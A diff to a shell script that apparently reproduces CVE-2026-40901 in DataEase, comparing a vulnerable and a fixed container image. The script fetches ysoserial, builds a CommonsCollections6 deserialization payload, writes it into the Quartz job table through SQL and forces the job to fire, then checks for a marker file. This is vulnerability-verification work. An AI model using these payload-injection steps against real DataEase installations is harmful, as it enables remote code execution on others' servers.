@@ -1,6 +1,9 @@
 --- repro/reproduction_steps.sh
 +++ repro/reproduction_steps.sh
-@@ -11,0 +12,13 @@
+@@ -9,13 +9,61 @@
+
+ cd "$ROOT"
+
 +export DOCKER_API_VERSION="${DOCKER_API_VERSION:-1.43}"
 +
 +SUDO=""
@@ -14,14 +17,17 @@
 +    $SUDO apt-get install -y -qq default-jdk-headless 2>&1 | tail -5
 +fi
 +
-@@ -16,3 +29,30 @@
+ # Configuration
+ VULNERABLE_IMAGE="registry.cn-qingdao.aliyuncs.com/dataease/dataease:v2.10.20"
+ FIXED_IMAGE="registry.cn-qingdao.aliyuncs.com/dataease/dataease:v2.10.21"
+ MYSQL_IMAGE="registry.cn-qingdao.aliyuncs.com/dataease/mysql:8.4.5"
 -YSOSERIAL_JAR="/tmp/ysoserial.jar"
 -PAYLOAD_BIN="/tmp/payload-cc6-repro.bin"
 -MARKER="/tmp/pruva-cve-2026-40901.txt"
 +SHARED_TMP="${PRUVA_REPRO_CACHE_DIR:-$ROOT/.pruva-repro-cache}/REPRO-2026-00167"
 +mkdir -p "$SHARED_TMP"
 +if [ -n "${PRUVA_REPRO_CACHE_DIR:-}" ]; then
-+    YSOSERIAL_CACHE="${PRUVA_REPRO_CACHE_DIR}/ysoserial-master-snapshot-1"
++    YSOSERIAL_CACHE="${PRUVA_REPRO_CACHE_DIR}/ysoserial-v0.0.6"
 +    mkdir -p "$YSOSERIAL_CACHE"
 +    YSOSERIAL_JAR="$YSOSERIAL_CACHE/ysoserial.jar"
 +    echo "[+] Using ysoserial cache: $YSOSERIAL_CACHE"
@@ -33,13 +39,21 @@
 +
 +download_ysoserial() {
 +    local tmp="${YSOSERIAL_JAR}.tmp"
++    local url="https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar"
 +    rm -f "$tmp"
-+    if ! curl -fsSL --retry 3 --retry-delay 2 \
-+        "https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar" \
-+        -o "$tmp"; then
-+        curl -fsSL --retry 3 --retry-delay 2 \
-+            "https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar" \
-+            -o "$tmp"
++
++    for attempt in 1 2; do
++        if curl -fL --retry 10 --retry-all-errors --retry-delay 5 --retry-max-time 300 \
++            --connect-timeout 20 --max-time 180 "$url" -o "$tmp"; then
++            break
++        fi
++        rm -f "$tmp"
++        sleep 10
++    done
++
++    if [[ ! -s "$tmp" ]] && command -v gh >/dev/null 2>&1; then
++        gh release download v0.0.6 --repo frohoff/ysoserial \
++            --pattern ysoserial-all.jar --output "$tmp" >/dev/null 2>&1 || true
 +    fi
 +    if ! jar tf "$tmp" >/dev/null 2>&1; then
 +        echo "[-] Downloaded ysoserial jar is invalid" >&2
@@ -48,22 +62,47 @@
 +    fi
 +    mv "$tmp" "$YSOSERIAL_JAR"
 +}
-@@ -27 +67 @@
+
+ echo "============================================"
+ echo "CVE-2026-40901 Reproduction"
+@@ -24,9 +72,9 @@
+ echo ""
+
+ # Step 1: Ensure ysoserial is available
 -if [[ ! -f "$YSOSERIAL_JAR" ]]; then
 +if [[ ! -f "$YSOSERIAL_JAR" ]] || ! jar tf "$YSOSERIAL_JAR" >/dev/null 2>&1; then
-@@ -29 +69 @@
+     echo "[+] Downloading ysoserial..."
 -    curl -sL "https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar" -o "$YSOSERIAL_JAR"
 +    download_ysoserial
-@@ -51 +91 @@
+ fi
+
+ # Step 2: Generate ysoserial CommonsCollections6 payload
+@@ -48,10 +96,10 @@
+ python3 -c "
+ with open('$PAYLOAD_BIN','rb') as f:
+     data = f.read()
 -with open('/tmp/payload.hex','w') as fh:
 +with open('$SHARED_TMP/payload.hex','w') as fh:
-@@ -54 +94 @@
+     fh.write(data.hex())
+ "
 -HEX=$(cat /tmp/payload.hex)
 +HEX=$(cat "$SHARED_TMP/payload.hex")
-@@ -71 +111 @@
+
+ # Step 3: Compile deserialization harness (for classpath test)
+ echo "[+] Compiling deserialization harness..."
+@@ -68,7 +116,7 @@
+     }
+ }
+ JAVAEOF
 -javac "$ROOT/DeserializeTest.java" -d /tmp
 +javac "$ROOT/DeserializeTest.java" -d "$SHARED_TMP"
-@@ -165,20 +205,24 @@
+
+ # Step 4: Verify commons-collections 3.x presence/absence
+ echo ""
+@@ -162,25 +210,29 @@
+ UPDATE dataease.QRTZ_JOB_DETAILS SET JOB_DATA = 0x${HEX} WHERE SCHED_NAME = 'deSyncJob' AND JOB_NAME = 'Datasource' AND JOB_GROUP = 'check_status';
+ " 2>&1
+
 -# Get next fire time
 -NEXT_FIRE=$(docker exec $MYSQL_V mysql -uroot -p'Password123@mysql' -e "SELECT NEXT_FIRE_TIME FROM dataease.QRTZ_TRIGGERS WHERE SCHED_NAME='deSyncJob' AND TRIGGER_NAME='Datasource';" 2>&1 | tail -n1)
 -WAIT_SECS=$(python3 -c "
@@ -81,9 +120,6 @@
 -  docker exec $DATAEASE_V cat /tmp/pruva-cve-2026-40901.txt > "$EVIDENCE/marker-vulnerable.txt" 2>/dev/null || true
 -  VULN_MARKER=1
 -else
--  echo "    [VULNERABLE] Marker file NOT found"
--  VULN_MARKER=0
--fi
 +# Force the Quartz trigger to fire promptly after payload injection instead of waiting
 +# for the scheduler's next several-minute interval.
 +FORCED_FIRE=$(python3 -c "import time; print(int(time.time()*1000) + 5000)")
@@ -106,10 +142,18 @@
 +done
 +
 +if [[ "$VULN_MARKER" != "1" ]]; then
-+  echo "    [VULNERABLE] Marker file NOT found"
-+fi
-@@ -206,2 +250,2 @@
+   echo "    [VULNERABLE] Marker file NOT found"
+-  VULN_MARKER=0
+ fi
+
+ echo "[+] Checking logs for Quartz deserialization evidence..."
+@@ -203,8 +255,8 @@
+ echo "========== TESTING FIXED v2.10.21 (Container Classpath) =========="
+
+ rm -f "$MARKER"
 -FIXED_OUTPUT=$(docker run --rm -v /tmp:/tmp "$FIXED_IMAGE" sh -c \
 -    "cd /opt/apps && rm -rf /tmp/extract-fixed && unzip -q app.jar 'BOOT-INF/lib/*' -d /tmp/extract-fixed && java -cp '/tmp:/tmp/extract-fixed/BOOT-INF/lib/*' DeserializeTest /tmp/payload-cc6-repro.bin && ls -la /tmp/pruva-cve-2026-40901.txt" 2>&1)
 +FIXED_OUTPUT=$(docker run --rm -v "$SHARED_TMP:/tmp" "$FIXED_IMAGE" sh -c \
 +    "cd /opt/apps && rm -rf /tmp/extract-fixed && unzip -q app.jar 'BOOT-INF/lib/*' -d /tmp/extract-fixed && java -cp '/tmp:/tmp/extract-fixed/BOOT-INF/lib/*' DeserializeTest /tmp/payload-cc6-repro.bin && ls -la /tmp/pruva-cve-2026-40901.txt" 2>&1 || true)
+
+ echo "$FIXED_OUTPUT" > "$EVIDENCE/fixed-container-test.log"
